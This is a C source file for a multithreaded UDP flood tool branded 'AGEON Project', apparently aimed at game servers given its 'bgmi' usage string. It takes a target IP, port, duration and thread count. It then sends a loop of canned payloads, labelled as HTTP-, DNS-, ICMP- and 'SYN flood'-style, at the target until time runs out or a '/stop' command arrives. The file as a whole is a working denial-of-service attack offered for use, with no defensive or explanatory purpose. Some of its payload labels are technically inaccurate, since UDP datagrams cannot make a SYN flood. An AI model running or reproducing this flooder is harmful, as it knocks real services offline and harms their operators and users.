#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define EXPIRATION_YEAR 2024
#define EXPIRATION_MONTH 9
#define EXPIRATION_DAY 30

int stop_attack = 0;  // Global flag to stop the attack

void usage() {
    printf("AGEON Project: Usage: ./bgmi ip port time threads\n");
    exit(1);
}

int check_expiration() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRATION_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 > EXPIRATION_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 == EXPIRATION_MONTH && current_time->tm_mday > EXPIRATION_DAY)) {
        return 1;  // Expired
    }
    return 0;  // Not expired
}

void show_expiration() {
    printf("AGEON Project: This program will expire on %d-%02d-%02d.\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Advanced payloads: various crafted packets with different sizes and structures
    char *payloads[] = {
        // Simple payloads (basic hex data)
        "\x41\x41\x41\x41",     // 'AAAA'
        "\x42\x42\x42\x42",     // 'BBBB'
        "\x43\x43\x43\x43",     // 'CCCC'

        // Larger payloads (1024 bytes)
        "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"
        "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"
        "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"
        "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44",

        // Simulated UDP flood (randomized bytes)
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee\xee"
        "\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd"
        "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc",

        // HTTP-like payloads (HTTP request simulation)
        "GET / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "User-Agent: AGEON-HighLoad\r\n"
        "Connection: Keep-Alive\r\n\r\n",

        // Custom ICMP-like payload
        "\x08\x00\x4d\x62\x00\x01\x52\x49\x4e\x47\x00\x00\x00\x00\x00\x00"
        "\x0a\x0a\x0a\x0a\x01\x01\x01\x01\xff\xff\xff\xff",

        // DNS-like flood
        "\x72\xfe\x1d\x13\x00\x00\x01\x00\x00\x00\x00\x00\x03\x77\x77\x77"
        "\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",

        // Large and complex payloads (2KB)
        "\x00\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        // Continues with more 'A's...

        // Simulated TCP handshake request (SYN flood)
        "\x16\x03\x01\x00\x6c\x01\x00\x00\x68\x03\x01\x53\x4b\x58\x50\x50"
        "\x54\x54\x4e\x00\x00\x00\x20\x00\x00\x06\x00\x00\x00\xff\xff"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("AGEON Project: Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime && !stop_attack) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("AGEON Project: Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

void *live_countdown(void *arg) {
    int remaining_time = *(int *)arg;

    while (remaining_time > 0 && !stop_attack) {
        printf("AGEON Project: Time left: %d seconds\r", remaining_time);
        fflush(stdout);
        sleep(1);  // Sleep for 1 second
        remaining_time--;
    }

    printf("\nAGEON Project: Attack completed!\n");
    pthread_exit(NULL);
}

void *listen_for_stop(void *arg) {
    char command[10];
    while (1) {
        scanf("%s", command);
        if (strcmp(command, "/stop") == 0) {
            stop_attack = 1;  // Set global flag to stop the attack
            printf("AGEON Project: Stopping attack...\n");
            break;
        }
    }
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    show_expiration();

    if (check_expiration()) {
        printf("AGEON Project: This code has expired. Please update it.\n");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    pthread_t stop_thread, countdown_thread;
    struct thread_data data = {ip, port, time};

    printf("AGEON Project: Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("AGEON Project: Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    if (pthread_create(&countdown_thread, NULL, live_countdown, (void *)&time) != 0) {
        perror("AGEON Project: Countdown thread creation failed");
        free(thread_ids);
        exit(1);
    }

    if (pthread_create(&stop_thread, NULL, listen_for_stop, NULL) != 0) {
        perror("AGEON Project: Stop command listener creation failed");
        free(thread_ids);
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    pthread_join(countdown_thread, NULL);
    pthread_join(stop_thread, NULL);

    free(thread_ids);
    printf("AGEON Project: Attack finished.\n");

    return 0;
}
